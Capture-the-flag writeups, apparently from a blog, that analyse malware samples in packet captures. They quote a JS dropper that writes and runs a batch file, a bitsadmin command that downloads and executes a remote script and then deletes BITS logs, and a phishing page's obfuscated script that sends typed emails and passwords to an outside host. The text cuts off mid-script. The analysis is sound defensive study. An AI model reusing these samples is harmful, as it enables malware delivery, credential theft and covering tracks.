That\u0026rsquo;s all for this .hta file. Now let\u0026rsquo;s move to the second pcap which contains the .js code retrieved, which is the stage 2 of the attack.\nThe code in the .js file is the following:\nvar lt135 = \u0026#34;QCVwcm9ncmFtZmlsZXM6fjE1LDElJWNvbXNwZWM6fi0xMiwxJSVjb21zcGVjOn4xNCwxJSVwcm9ncmFtZmlsZXM6fjEwLDElJz1eIj4lY29tbW9ucHJvZ3JhbWZpbGVzOn4#%MiwxJXUlcHJvZ3JhbWZpbGVzOn4xM#%wxJSZAJWNvbXNwZWM6fi0zLDElJWNvbXNwZWM6fjIwLDElaCVjb21tb25wcm9ncmFtZmlsZXM6fjE4LDElJWNvbW1vbnB#%b2d#%YW1maWxlczp+MjMsMSUlY29tbW9ucHJvZ3JhbWZpbGVzOn4tMTEsMSVmZiZAJWNvbW1vbnB#%b2d#%YW1maWxlczp+LTEsMSUlY29tc3BlYzp+LTEsMSUlY29tc3BlYzp+LTEzLDElJXB#%b2d#%YW1maWxlczp+LTYsMSUnPSVvczp+NSwxJV5eXi1eXl43Xl5eJXBh---snip---\u0026#34; var re = new RegExp(\u0026#34;#%\u0026#34;, \u0026#34;g\u0026#34;); lt135 = lt135.replace(re, \u0026#34;y\u0026#34;); var gj4fjrg = WScript.CreateObject(\u0026#34;WScript.Shell\u0026#34;); var fkfo3l = gj4fjrg.ExpandEnvironmentStrings(\u0026#34;%appdata%\u0026#34;); var whshis4 = fkfo3l + \u0026#34;\\\\kQiFcryrxG.bat\u0026#34;; var dcdd = decodeBase64(lt135); writeBytes(whshis4, dcdd); gj4fjrg.run(\u0026#34;\\\u0026#34;\u0026#34; + whshis4 + \u0026#34;\\\u0026#34;\u0026#34;); This basically makes some replacements in the specified code, decodes the long b64 string and saves it in the appdata folder as a .bat file. By following the same operations, we end up with this .bat file:\nThis kinda seems like normal envar obfuscation but it is slightly different. It combines multiple known batch obfuscation techniques, such as pre existing envars, custom dictionary etc. One could try to deobfuscate this manually, but there is a twist in this specific batch file. Let\u0026rsquo;s save it and upload it to VirusTotal to see what I mean:\nThe thing to take away here is that VirusTotal sometimes will identify known techniques and specify them. Here, we see an interesting text: \u0026ldquo;BatchEncryption\u0026rdquo;. Let\u0026rsquo;s google this and see what comes up:\nDamn. By opening a few tabs and reading the articles (well, translated except if you know chinese), we learn that this is a tecnhique implemented by a tool named BatchEncryptor which was created by gwsbhqt@163.com. There is also the corresponding tool to decode the whole .bat file for us! This tool exists in this repo:\nhttps://github.com/cnHopeStudio/Batch-Encryption-DeCoder (its the first google search result we got previously). By building this tool and running it, we get the deobfuscated bat code which is\u0026hellip;another obfuscated command:\nThe new command we are called to deobfuscate is:\ncmd /V /C \u0026#34;set shgyngmcqs=0XoY\u0026amp;Ndh%Cas3WlpPRn\\meFQwgf/U2D5T:.k tbzri*uMc\u0026amp;\u0026amp;FOR %A IN (38 41 37 11 10 6 20 41 18 36 27 37 40 10 18 11 26 21 40 36 17 28 5 32 23 12 11 0 5 39 6 26 5 29 25 39 5 32 5 26 3 29 25 0 44 13 31 35 1 39 45 39 3 29 7 43 44 13 5 2 44 39 28 36 7 37 37 15 33 27 27 11 43 18 40 41 39 25 14 12 27 37 34 38 10 37 36 8 37 20 15 8 19 37 34 38 10 37 36 4 36 8 37 20 15 8 19 37 34 38 10 37 36 4 36 11 45 36 11 37 2 15 36 38 41 37 11 36 4 36 37 41 20 21 2 43 37 36 31 36 4 36 6 21 14 36 27 23 36 27 22 36 9 33 19 16 40 2 25 40 10 20 30 10 37 10 19 44 41 45 40 2 11 2 26 37 19 5 21 37 24 2 40 35 19 30 2 24 18 14 2 10 6 21 40 19 42 36 4 36 11 45 36 11 37 10 40 37 36 38 41 37 11 1337) DO set xqzwdomkia=!xqzwdomkia!!shgyngmcqs:~%A,1!\u0026amp;\u0026amp; IF %A==1337 CALL %xqzwdomkia:~-213%\u0026#34; If we read this carefully, we will see that it is not that difficult to deobfuscate. Basically, it just sets a dictionary, then runs a loop and takes a specific character of the corresponding index based on the loop. It recreates the command to be run and then calls it. Let\u0026rsquo;s use python to deobfuscate this:\nNote: The technique used is an existing one and is called \u0026ldquo;forencoding obfuscation\u0026rdquo;.\nThe result we get is the following bitsadmin command:\nbitsadmin /transfer RUNTQ3s0NzdfN2gzNTNfY2g0MW5kXzczY2huMWNoMzU http://sunrizgl3/t.bat %tmp%\\\\t.bat \u0026amp; %tmp%\\\\t.bat \u0026amp; sc stop bits \u0026amp; timeout 5 \u0026amp; del /Q /F C:\\\\ProgramData\\\\Microsoft\\\\Network\\\\Downloader\\\\* \u0026amp; sc start bits Bitsadmin command creates jobs and assigns them a task. Here, bitsadmin creates a job named RUNTQ3s0NzdfN2gzNTNfY2g0MW5kXzczY2huMWNoMzU to download a .bat file from a domain, run it, then stop the bitsadmin process in order to delete its logs and then starts it again. We can agree on that the job\u0026rsquo;s name is really sus and if we decode it from b64 we get the first part of the flag:\nNice. All that\u0026rsquo;s left is the last .bat file in the remaining pcap. Opening it, we get another obfuscated .bat file different than the previous one:\nAgain, one can try and deobfuscate it manually, but why not follow up with the same methodology as previously? Loading the file in VT, we get another interesting name:\nIt is not as easy as with the previous one to indentify the right name, but after a bit of googling we can see that Jlaive is a tool used for obfuscation that gives a matching result as the one we have:\nSo basically, Jlaive is a tool used to convert .NET executables to obfuscated .bat files. Interesting. Well, for such a tool to exist, there must be the corresponding tool that does the reverse operation. Searching for a bit, we find a tool named Get-UnJlaive which can be found in the following repo:\nhttps://github.com/Dump-GUY/Get-UnJlaive This tool reconstructs the original executable before it was converted to this .bat. Setting up the tool and running it, we successfully get an executable back:\nIf we run the file command on the .exe, we see its a Mono/.NET assembly:\n└─$ file t.bat_orig.exe t.bat_orig.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows Loading the executable to DnSpy, we are met with\u0026hellip;another seemingly obfuscated file:\nThis executable seems to have been packed with some .NET packer. This time, VT won\u0026rsquo;t be of any help to us. We can either identify the packer used by either using a simple strings command which will reveal the path where this executable was stored at build time, or we can search through the functions of the executable and find the packer in the class \u0026ldquo;cab44dfc2d326bea8c4438eb03ca73b4d\u0026rdquo;:\nusing System; using System.Reflection; namespace A { // Token: 0x02000007 RID: 7 internal class cab44dfc2d326bea8c4438eb03ca73b4d { // Token: 0x0600001A RID: 26 RVA: 0x00003868 File Offset: 0x00001A68 private static string ccea6e29829419d8153060be40cf7772a(Assembly cdefd3af7ac5b57777d7057f73f12ed1e) { string text = cdefd3af7ac5b57777d7057f73f12ed1e.FullName; int num = text.IndexOf(\u0026#39;,\u0026#39;); if (num \u0026gt;= 0) { text = text.Substring(0, num); } return text; } // Token: 0x0600001B RID: 27 RVA: 0x00003898 File Offset: 0x00001A98 internal static void c5b6799dda81c5313f25256842d094434() { string text = \u0026#34;638492234169640792\u0026#34;; DateTime dateTime = new DateTime(long.Parse(text)); if (DateTime.Now \u0026gt; dateTime) { for (;;) { switch (4) { case 0: continue; } break; } if (!true) { RuntimeMethodHandle runtimeMethodHandle = methodof(cab44dfc2d326bea8c4438eb03ca73b4d.c5b6799dda81c5313f25256842d094434()).MethodHandle; } string text2 = cab44dfc2d326bea8c4438eb03ca73b4d.ccea6e29829419d8153060be40cf7772a(Assembly.GetExecutingAssembly()); string text3 = string.Concat(new string[] { \u0026#34;The assembly \u0026#39;\u0026#34;, text2, \u0026#34;\u0026#39; is created with an evaluation version of CryptoObfuscator and will stop working on \u0026#34;, dateTime.ToString(\u0026#34;d-MMM-yyyy.\u0026#34;), \u0026#34; The evaluation period has expired and the application will now exit.\u0026#34; }); throw new Exception(text3); } } } } CryptoObfuscator! The only thing that is left to do is to find the corresponding tool to deobfuscate the executable for us. The one I will use can be found in the following repo:\nhttps://github.com/Rhotav/Crypto-Deobfuscator Building and running the tool, we get the deobfuscated file:\nSearching through the deobfuscated methods, we see the executable is basically a keylogger that sends the logged keystrikes through email. In method_4, we can find the part2 of our flag:\nFull flag: ECSC{477_7h353_ch41nd_73chn1ch35_f02_ju57_4_k3yl09932}\n","permalink":"http://localhost:1313/ctfwriteups/mranderson/","summary":"\u003ch1 id=\"this-is-a-writeup-for-the-mr-anderson-challenge\"\u003eThis is a writeup for the Mr Anderson challenge\u003c/h1\u003e\n\u003cp\u003eThis challenge gives us a zip file containing 3 pcap files:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/writeups/ecsc_gr2024/images/image.png\" alt=\"alt text\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eWhat we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.\u003c/p\u003e\n\u003cp\u003eWe can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap.\u003c/p\u003e","title":"Mr Anderson - Writeup"},{"content":"Starting the analysis A pcap file is provided to the user. Pcap files are network capture files that provide an insight of what requests were made to what websites, the contents of each request and much more.\nOpening the file with Wireshark, we can view all the requests.\nThe request that is of interest is the one made to themrbeas7.org and is the following:\nGET /christmasGiveaway/index.html HTTP/1.1 Host: themrbeas7.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 HTTP/1.0 200 OK Server: Apache/2.4.43 (FreeBSD) Date: Mon, 04 Dec 2023 10:09:52 GMT Content-type: text/html Content-Length: 10649 Last-Modified: Sun, 03 Dec 2023 17:25:38 GMT \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;img/Favicon.png\u0026#34; type=\u0026#34;image/x-icon\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Xmas Giveaway\u0026lt;/title\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;js/jquery.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;js/timer.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;js/script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;css/bootstrap.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;css/font-awesome.min.css\u0026#34;\u0026gt; \u0026lt;link href=\u0026#39;http://fonts.googleapis.com/css?family=Lobster\u0026#39; rel=\u0026#39;stylesheet\u0026#39; type=\u0026#39;text/css\u0026#39;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;css/custom.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body onload=\u0026#34;countdown(year,month,day,hour,minute)\u0026#34;\u0026gt; \u0026lt;!-- Carousel --\u0026gt; \u0026lt;div id=\u0026#34;myCarousel\u0026#34; class=\u0026#34;carousel slide\u0026#34; data-ride=\u0026#34;carousel\u0026#34;\u0026gt; \u0026lt;!-- Indicators --\u0026gt; \u0026lt;ol class=\u0026#34;carousel-indicators\u0026#34;\u0026gt; \u0026lt;li data-target=\u0026#34;#myCarousel\u0026#34; data-slide-to=\u0026#34;0\u0026#34; class=\u0026#34;active\u0026#34;\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li data-target=\u0026#34;#myCarousel\u0026#34; data-slide-to=\u0026#34;1\u0026#34; \u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li data-target=\u0026#34;#myCarousel\u0026#34; data-slide-to=\u0026#34;2\u0026#34;\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ol\u0026gt; \u0026lt;div class=\u0026#34;carousel-inner\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;container timer\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;home\u0026#34; class= \u0026#34;logo text-center\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;font color=\u0026#34;red\u0026#34;\u0026gt;Christmas is almost here\u0026lt;/font\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;row timer-circle\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;main-text text-center\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;sub-text\u0026#34;\u0026gt;Giveaway countdown\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;text-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;numbers\u0026#34; id=\u0026#34;count2\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;col-lg-12 col-md-12 col-sm-12 col-xs-12 text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;circle text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer1\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;numbers\u0026#34; id= \u0026#34;dday\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer2\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34; id= \u0026#34;days\u0026#34;\u0026gt;Day\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;circle text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer1\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;numbers\u0026#34; id= \u0026#34;dhour\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer2\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34; id= \u0026#34;hours\u0026#34;\u0026gt;Hr\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;circle text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer1\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;numbers\u0026#34; id= \u0026#34;dmin\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer2\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34; id= \u0026#34;minutes\u0026#34;\u0026gt;Min\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;circle text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer1\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;numbers\u0026#34; id= \u0026#34;dsec\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer2\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34; id= \u0026#34;seconds\u0026#34;\u0026gt;Sec\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of clock --\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of timer-circle --\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of timer --\u0026gt; \u0026lt;div class=\u0026#34;item active\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;img/mrBeast.jpg\u0026#34; alt=\u0026#34;First slide\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;carousel-caption caption\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;The biggest christmas giveaway is on its way...\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of first item --\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;img/santa.jpg\u0026#34; alt=\u0026#34;Second slide\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;carousel-caption caption\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;You may be one of the lucky ones that will meet Santa...\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of second item --\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;img/elfs.jpeg\u0026#34; alt=\u0026#34;Third slide\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;carousel-caption caption\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Subscribe! The Mr. Beast team is waiting to meet you!\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of third item --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of carousel --\u0026gt; \u0026lt;div class= \u0026#34;body-content\u0026#34;\u0026gt; \u0026lt;!-- subscribe --\u0026gt; \u0026lt;div class= \u0026#34;container subscribe\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;col-lg-6 col-lg-offset-3 subscribe-text\u0026#34;\u0026gt; \u0026lt;h3 class= \u0026#34;text-center\u0026#34;\u0026gt;Subscribe\u0026lt;/h3\u0026gt; \u0026lt;hr class= \u0026#34;full\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Welcome to the biggest ever giveaway by the Mr. Beast team!\u0026lt;/p\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of subscribe --\u0026gt; \u0026lt;div class= \u0026#34;container after-slide\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-6 col-md-offset-3 col-lg-8 col-lg-offset-2 col-sm-12 col-xs-12 text-center\u0026#34;\u0026gt; \u0026lt;p class= \u0026#34;after-slide-text\u0026#34;\u0026gt;Secure your chance to win a fully paid trip to the North Pole by registering now! Don\u0026#39;t miss out on the opportunity to be among the exclusive group of participants eligible for this exciting giveaway. Register your account today for a chance at winning this exclusive trip and meeting Santa Claus in person!\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;subscribe-form\u0026#34; \u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;input-group margin-bottom-sm col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12 text-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;input-group-addon\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-envelope-o fa-fw\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;input class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Email address\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;input-group col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12 text-center form\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;input-group-addon\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-key fa-fw\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;input class=\u0026#34;form-control\u0026#34; type=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;input-group margin-bottom-sm col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-info\u0026#34;\u0026gt;Subscribe\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of after slide part --\u0026gt; \u0026lt;!-- share part --\u0026gt; \u0026lt;div class=\u0026#34;container share\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;col-lg-6 col-lg-offset-3 share-text\u0026#34;\u0026gt; \u0026lt;h3 class= \u0026#34;text-center\u0026#34;\u0026gt;Our Socials\u0026lt;/h3\u0026gt; \u0026lt;hr class= \u0026#34;full\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Find us at our social media platforms to be updated about the results\u0026lt;/p\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;container share-icons text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;col-lg-12 col-md-12 col-sm-12 col-xs-12\u0026#34;\u0026gt; \u0026lt;ul class=\u0026#34;socials-icons col-lg-12 col-md-12 col-sm-12 col-xs-12\u0026#34;\u0026gt; \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;https://www.facebook.com/MrBeast6000\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; title=\u0026#34;Share in Facebook\u0026#34; class=\u0026#34;facebook\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-facebook\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;https://twitter.com/mrbeast?lang=en\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; title=\u0026#34;Share in Twitter\u0026#34; class=\u0026#34;twitter\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-twitter\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;https://www.instagram.com/mrbeast/?hl=en\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; title=\u0026#34;Share in Instagram\u0026#34; class=\u0026#34;instagram\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-instagram\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of share part --\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of body content --\u0026gt; \u0026lt;!-- footer --\u0026gt; \u0026lt;div class=\u0026#34;wrapper footer\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row text-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;name col-lg-2 col-md-2 col-sm-2 col-xs-12 text-center\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Giveaway\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-lg-8 col-md-8 col-sm-8 col-xs-12 text-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;copyright\u0026#34;\u0026gt; \u0026amp;copy; Mr.Beast Team \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;col-lg-2 col-md-2 col-sm-2 col-xs-12\u0026#34; id=\u0026#34;back-top\u0026#34;\u0026gt; \u0026lt;p class= \u0026#34;pull-right\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;#home\u0026#34;\u0026gt;\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;Top\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;\t\u0026lt;/div\u0026gt;\t\u0026lt;/div\u0026gt;\u0026lt;!-- row --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!--end of footer --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;script\u0026gt; function _0x299a(_0xa725a8,_0x48ecb7){var _0x33465e=_0x3346();return _0x299a=function(_0x299a8c,_0x4edf29){_0x299a8c=_0x299a8c-0x7f;var _0x3b4711=_0x33465e[_0x299a8c];return _0x3b4711;},_0x299a(_0xa725a8,_0x48ecb7);}var _0x52de18=_0x299a;function _0x3346(){var _0x1cd6fe=[\u0026#39;length\u0026#39;,\u0026#39;.subscribe-form\\x20.form-control[type=\\x22password\\x22]\u0026#39;,\u0026#39;click\u0026#39;,\u0026#39;10GjwUiH\u0026#39;,\u0026#39;283448ojrvqi\u0026#39;,\u0026#39;PSkvNyoILFxaI0BVW0M+RlBZR1QsVVxHPkAXXUYYBAldRlIsD14DVRdVF0Ec\u0026#39;,\u0026#39;.subscribe-form\\x20.btn.btn-info\u0026#39;,\u0026#39;GET\u0026#39;,\u0026#39;11wIJUzs\u0026#39;,\u0026#39;385aGCgYF\u0026#39;,\u0026#39;203916QRBBAJ\u0026#39;,\u0026#39;addEventListener\u0026#39;,\u0026#39;186854HAAPmi\u0026#39;,\u0026#39;DOMContentLoaded\u0026#39;,\u0026#39;push\u0026#39;,\u0026#39;34662TcBphL\u0026#39;,\u0026#39;join\u0026#39;,\u0026#39;open\u0026#39;,\u0026#39;value\u0026#39;,\u0026#39;querySelector\u0026#39;,\u0026#39;charCodeAt\u0026#39;,\u0026#39;5003910eMoXPe\u0026#39;,\u0026#39;945368MfXSkw\u0026#39;,\u0026#39;9CofhOF\u0026#39;,\u0026#39;\u0026amp;apikey=\u0026#39;,\u0026#39;https://storage.appssec.co.ind?email=\u0026#39;,\u0026#39;send\u0026#39;,\u0026#39;724557XgnpSv\u0026#39;];_0x3346=function(){return _0x1cd6fe;};return _0x3346();}(function(_0x104a86,_0xa6db47){var _0x4c8d43=_0x299a,_0xf91101=_0x104a86();while(!![]){try{var _0x29d6b2=-parseInt(_0x4c8d43(0x8c))/0x1+parseInt(_0x4c8d43(0x94))/0x2+-parseInt(_0x4c8d43(0x87))/0x3+-parseInt(_0x4c8d43(0x92))/0x4*(parseInt(_0x4c8d43(0x8b))/0x5)+parseInt(_0x4c8d43(0x97))/0x6*(parseInt(_0x4c8d43(0x91))/0x7)+-parseInt(_0x4c8d43(0x82))/0x8*(parseInt(_0x4c8d43(0x83))/0x9)+parseInt(_0x4c8d43(0x81))/0xa*(parseInt(_0x4c8d43(0x90))/0xb);if(_0x29d6b2===_0xa6db47)break;else _0xf91101[\u0026#39;push\u0026#39;](_0xf91101[\u0026#39;shift\u0026#39;]());}catch(_0x4597d0){_0xf91101[\u0026#39;push\u0026#39;](_0xf91101[\u0026#39;shift\u0026#39;]());}}}(_0x3346,0x28a39),document[_0x52de18(0x93)](_0x52de18(0x95),function(){var _0x3010de=_0x52de18;const _0x4c17d1=document[\u0026#39;querySelector\u0026#39;](_0x3010de(0x8e)),_0x5bc16f=document[_0x3010de(0x7f)](\u0026#39;.subscribe-form\\x20.form-control[type=\\x22text\\x22]\u0026#39;),_0x106e8a=document[_0x3010de(0x7f)](_0x3010de(0x89));_0x4c17d1[_0x3010de(0x93)](_0x3010de(0x8a),function(){var _0xaf724a=_0x3010de;const _0x3a9d03=_0x5bc16f[_0xaf724a(0x9a)],_0x38e031=_0x106e8a[_0xaf724a(0x9a)];var 